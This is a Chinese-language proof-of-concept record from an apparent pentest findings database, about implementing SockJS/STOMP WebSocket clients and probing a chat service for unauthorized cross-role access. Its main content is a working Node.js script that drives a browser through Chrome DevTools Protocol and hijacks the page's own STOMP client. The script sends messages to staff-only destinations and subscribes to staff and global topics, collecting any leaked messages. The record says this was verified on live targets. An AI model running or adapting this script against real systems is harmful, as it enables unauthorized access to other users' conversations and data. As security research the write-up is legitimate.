# SockJS + STOMP WebSocket 客户端实现要点（JSON 数组发送侧编码 / 版本协商 / CDP 抄帧法）

- **code**: sockjs-stomp-websocket-客户端实现要点-json-数组发送侧编码-版本协商-cdp-抄帧法
- **kind**: script
- **category**: unauthorized
- **component**: SockJS + STOMP over WebSocket
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在真实目标 203.0.113.83:3493 / 203.0.113.82:3493 上实测验证：JSON 数组包裹 + accept-version:1.1,1.0 + x-v-token/cid/vid 头，成功收到 a["CONNECTED\nversion:1.1\nheart-beat:25000,25000\nuser-name:101096_812609362815225857\n\n\u0000"] 并完成 SUBSCRIBE 订阅；同参数下发裸帧被 c[1007,""] 关闭（对照组）。
- **path**: pocs/sockjs-stomp-websocket-客户端实现要点-json-数组发送侧编码-版本协商-cdp-抄帧法/poc.py
- **tags**: websocket,sockjs,stomp,协议逆向,CDP
- **created_at**: 2026-09-28T09:14:23.381Z
- **found_by**: exploit

## 描述

SockJS + STOMP WebSocket 客户端正确实现要点（踩坑总结）：① SockJS websocket transport 的路径是 /{baseUrl}/{3位server}/{8位session}/websocket，baseUrl 通常以 / 结尾（/api/v1/v/ws 会 301 到 /api/v1/v/ws/，GET /info 返回 {"websocket":true,...} 表示可用）；② **发送侧必须把每条 STOMP 帧包成 JSON 数组**（["CONNECT\n...\u0000"]）—— 这是最容易踩的坑：发裸文本或裸 STOMP 帧会被服务端以 c[1007,""]（invalid payload data）瞬间关闭，而发 ["hello"] 不会被关闭，可据此快速判别编码要求；③ 服务端可能只接受特定版本，本目标只接受 accept-version:1.1,1.0（发 1.2 或带 host:localhost 均无响应/被关）；④ 认证头（如 x-v-token）既要在 WebSocket 升级请求的 HTTP header 里带，也常需在 STOMP CONNECT 帧 header 里重复带；⑤ 服务端 CONNECTED 帧会用 user-name 暴露身份绑定规则；⑥ 若手动实现卡住，最有效的手段是用 CDP 驱动真实浏览器加载官方前端、调其自身 SDK 建立连接，并监听 Network.webSocketFrameSent / webSocketFrameReceived（**payload 在 params.response.payloadData，不是顶层 payloadData**），直接抄官方帧格式。

## 用法

```
1) 探测：GET {base}/info 看 websocket 是否为 true；2) 握手：wss://host{base}/{server}/{session}/websocket，HTTP header 带认证头；3) 收 "o" 后发送 json.dumps(["CONNECT\naccept-version:1.1,1.0\nheart-beat:5000,5000\n<自定义 header>\n\n\x00"])；4) 收 a["CONNECTED..."] 后订阅 json.dumps(["SUBSCRIBE\nid:sub-0\ndestination:<dest>\n\n\x00"])；5) 发消息 json.dumps(["SEND\ndestination:<dest>\ncontent-length:N\n\n<body>\x00"])；6) 任何发送被 c[1007,""] 关掉时，优先怀疑发送侧编码（是否需 JSON 数组包裹）与 STOMP 版本。参考实现见 C:\rt\dgha\ocs_sockjs.py、ocs_ws_disc.py（判别实验）、ocs_ws_conv.js（CDP 抄帧）。
```

## 正文

```
// Bring the socket up under capture, dump the complete STOMP conversation,
// then probe cross-role destinations through the official stompClient.
const fs = require('fs');
const CDP_PORT = 9222, OUT = 'C:\\rt\\dgha\\runs\\ocs_ws_conv.jsonl';
const sleep = ms => new Promise(r => setTimeout(r, ms));

(async () => {
  const list = await (await fetch(`http://127.0.0.1:${CDP_PORT}/json/list`)).json();
  const page = list.find(t => t.type === 'page');
  const ws = new WebSocket(page.webSocketDebuggerUrl);
  let id = 0; const pending = new Map();
  const send = (m, p = {}) => { const i = ++id; ws.send(JSON.stringify({ id: i, method: m, params: p })); return new Promise(r => pending.set(i, r)); };
  await new Promise(r => ws.onopen = r);
  const out = fs.createWriteStream(OUT, { flags: 'w' });
  const seen = [];
  ws.onmessage = ev => {
    const m = JSON.parse(ev.data);
    if (m.id && pending.has(m.id)) { pending.get(m.id)(m); pending.delete(m.id); return; }
    if (m.method && m.method.startsWith('Network.webSocket')) {
      const p = m.params || {}, r = p.response || {};
      const rec = { m: m.method.replace('Network.webSocket', ''), url: p.url || '', op: r.opcode, payload: r.payloadData !== undefined ? String(r.payloadData) : undefined, err: p.errorMessage };
      if (rec.payload === undefined && !rec.url && !rec.err) return;
      seen.push(rec); out.write(JSON.stringify(rec) + '\n');
      console.log(`[${rec.m}] ${JSON.stringify(rec.payload !== undefined ? rec.payload : (rec.url || rec.err))}`);
    }
  };
  const evalx = async (expr) => {
    const r = await send('Runtime.evaluate', { expression: expr, returnByValue: true, awaitPromise: true, allowUnsafeEvalBlockedByCSP: true });
    return r.result?.exceptionDetails ? 'EXC ' + String(r.result.exceptionDetails.exception?.description).slice(0, 300) : r.result?.result?.value;
  };
  const q = async (l, e) => { const v = await evalx(e); console.log(`\n### ${l}\n` + String(typeof v === 'string' ? v : JSON.stringify(v)).slice(0, 1300)); return v; };

  await send('Network.enable', { maxResourceBufferSize: 1 << 26, maxTotalBufferSize: 1 << 28 });
  await send('Runtime.enable');
  const V = 'document.querySelector("#app").__vue__';

  console.log('=== bringing socket up under capture ===');
  await q('call transceiver.init()', `(()=>{const t=${V}.$root.transceiver;try{t.init();return "init() ok"}catch(e){return "ERR "+e}})()`);
  await sleep(9000);
  await q('state', `(()=>{const t=${V}.$root.transceiver;return JSON.stringify({connected:t.stompClient&&t.stompClient.connected,url:t.socket&&t.socket.url,subs:t.stompClient&&Object.keys(t.stompClient.subscriptions||{})})})()`);

  // ---- probe: send to visitor destination (baseline) ----
  console.log('\n=== baseline send to /app/visitor/ack ===');
  await q('send /app/visitor/ack', `(()=>{const t=${V}.$root.transceiver;try{t.stompClient.send("/app/visitor/ack",{},JSON.stringify({msgType:101,test:"baseline"}));return "sent"}catch(e){return "ERR "+e}})()`);
  await sleep(4000);

  // ---- probe: cross-role destinations ----
  const DESTS = [
    '/app/staff/ack', '/app/staff/list', '/app/staff/sessions', '/app/staff/auth',
    '/app/visitor/list', '/app/visitor/sessions', '/app/visitor/history',
    '/app/sessions', '/app/session/list', '/app/staff',
  ];
  for (const d of DESTS) {
    console.log(`\n=== probe dest ${d} ===`);
    await q('send ' + d, `(()=>{const t=${V}.$root.transceiver;try{t.stompClient.send("${d}",{},JSON.stringify({msgType:102,cid:101096}));return "sent"}catch(e){return "ERR "+e}})()`);
    await sleep(1800);
  }

  // ---- probe: subscribe to staff/staff-wide topics ----
  const TOPICS = ['/topic/staff/receive', '/user/topic/staff/receive', '/topic/staff', '/topic/visitor/receive', '/topic/all', '/user/topic/visitor/receive'];
  for (const tp of TOPICS) {
    console.log(`\n=== subscribe ${tp} ===`);
    await q('subscribe ' + tp, `(()=>{const t=${V}.$root.transceiver;try{t.stompClient.subscribe("${tp}",function(m){window.__leak=(window.__leak||[]);window.__leak.push(m.body)});return "subscribed"}catch(e){return "ERR "+e}})()`);
    await sleep(1500);
  }
  await sleep(9000);
  await q('any leaked messages?', `JSON.stringify((window.__leak||[]).slice(0,5))`);
  await q('subs now', `(()=>{const t=${V}.$root.transceiver;return JSON.stringify(Object.keys(t.stompClient.subscriptions||{}))})()`);

  console.log('\n=== total frames: ' + seen.length + ' ===');
  process.exit(0);
})();

```
